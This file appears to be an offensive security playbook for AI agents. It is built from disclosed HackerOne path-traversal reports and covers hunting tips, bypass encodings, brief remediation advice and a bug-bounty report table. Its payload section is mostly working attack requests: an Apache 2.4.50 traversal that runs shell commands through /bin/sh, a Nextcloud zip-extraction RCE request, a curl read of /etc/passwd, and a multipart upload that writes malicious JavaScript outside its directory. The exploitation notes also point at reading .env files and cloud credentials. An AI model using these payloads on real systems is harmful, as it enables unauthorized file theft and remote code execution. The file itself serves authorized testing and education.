---
name: path-traversal-file
description: "Path Traversal & File Access offensive playbook from 137 disclosed HackerOne reports (20 critical, 66 high, 38 medium, 13 low). Use when hunting or reviewing path traversal & file access. Triggers: traversal, path, file, arbitrary, server."
license: "For authorized security testing and education only."
---

# Path Traversal & File Access

> Distilled from **137** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

A file path derived from user input escapes the intended directory, enabling arbitrary file read/write/inclusion.

## Where to hunt

- Find file params: download/export, template/theme loaders, avatar/import, log viewers, `?file=`, `?path=`, archive extraction.
- Probe with `../`, encoded variants, and absolute paths.

## Exploitation playbook

- Read `/etc/passwd`, app config, `.env`, cloud creds, source; write into web roots/startup dirs for code exec.
- Zip-slip: archive entries with `../` that write outside the extraction dir.

## Bypass techniques

- Encoding: `%2e%2e%2f`, double-encode, `....//`, backslashes on Windows, unicode/overlong UTF-8.
- Null byte / extension append tricks; symlink following.

## Impact & escalation

- Config/secret read → auth bypass or RCE; file write → code execution.

## Remediation

- Canonicalize and confirm the resolved path stays under an allowed base dir; use opaque IDs not raw paths; validate archive entry paths.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#765291](https://hackerone.com/reports/765291)  -  Remote code execution via path traversal in Zip extraction in the E…
*high*

```http
POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1
Host: 192.168.100.32
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: https://192.168.100.32
Cookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG…

nameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0
```

### 2. [#1404731](https://hackerone.com/reports/1404731)  -  Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50
*critical, $1,000*

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M
```

### 3. [#924407](https://hackerone.com/reports/924407)  -  Local File Disclosure /Delete On [us-az-vpn.acronis.com]
*medium*

```http
GET /+CSCOE+/session_password.html HTTP/1.1
Host: 192.168.1.100
Cookie: token=../../../../../../+CSCOE+/wrong_url.html
```

### 4. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with…
*medium*

```bash
$ curl -v --path-as-is localhost:8080/../../../../../../etc/passwd
*   Trying ::1...
* connect to ::1 port 8080 failed: Connection refused
*   Trying 127.0.0.1...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 500 Internal Server Error
< Content-Type: text/html; charset=utf8
< Date: Mon, 21 May 2018 13:08:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
{"code":500,"message":"Internal Server Error"}
```

### 5. [#343726](https://hackerone.com/reports/343726)  -  Unrestricted file upload (RCE)
*critical*

```http
POST /admin/file/upload HTTP/1.1
Host: localhost:1111
Referer: http://localhost:1111/
Content-Type: multipart/form-data; boundary=---------------------------1099055603892737061752875043
Cookie: [ADMINISTRATOR_COOKIE]

-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="upload_file"; filename="app.js"
Content-Type: image/png

[MALICIOUS_JAVASCRIPT]
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="productId"

5ae2228d995e3e5d7c96474d
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="directory"

../../
-----------------------------1099055603892737061752875043
Content-Disposition: form-data; name="saveButton"

-----------------------------1099055603892737061752875043--
```

### 6. [#765291](https://hackerone.com/reports/765291)  -  Remote code execution via path traversal in Zip extraction in the E…
*high*

```http
POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1
Host: 192.168.100.32
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: https://192.168.100.32
```

More payloads: see [payloads.md](payloads.md) (208 curated).

## Recurring patterns in this dataset

Most frequent terms across the 137 reports (term (count)): `traversal` (136), `path` (135), `file` (78), `arbitrary` (52), `server` (50), `files` (44), `read` (42), `directory` (35), `attacker` (28), `allowed` (26), `discovered` (17), `remote` (17), `access` (17), `node.js` (15), `content` (14), `paths` (14), `permission` (14), `model` (14)

## Worked example  -  [report #1439593](https://hackerone.com/reports/1439593)

*Arbitrary file read  via the bulk imports UploadsPipeline* (critical, $29,000)

> Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group. When a group has uploads (such as markdown attachments), an uploads.tar.gz file will be downloaded and extracted in the UploadsPipeline: https://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk imports/common/pipelines/uploads pipeline.rb L15 Since untar zxf only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When load is called, the symlinks will be followed and used as the content for the new file: https://gitlab.com/gitlab-org/gitlab/-/blob/v14…

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1439593](https://hackerone.com/reports/1439593) | critical | $29,000 | gitlab | Arbitrary file read  via the bulk imports UploadsPipeline |
| [#827052](https://hackerone.com/reports/827052) | critical | $20,000 | gitlab | Arbitrary file read via the UploadsRewriter when moving and issue |
| [#1132378](https://hackerone.com/reports/1132378) | critical | $16,000 | gitlab | Arbitrary file read during project import |
| [#1394916](https://hackerone.com/reports/1394916) | critical | $4,000 | ibb | Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 |
| [#1400238](https://hackerone.com/reports/1400238) | critical | $1,000 | ibb | Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incom… |
| [#1404731](https://hackerone.com/reports/1404731) | critical | $1,000 | ibb | Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50 |
| [#876295](https://hackerone.com/reports/876295) | critical |  -  | starbucks | Misuse of an authentication cookie combined with a path traversal on app.starbucks.com … |
| [#436928](https://hackerone.com/reports/436928) | critical |  -  | wordpress | RCE as Admin defeats WordPress hardening and file permissions |

*See [reference.md](reference.md) for all 137 reports in this class.*
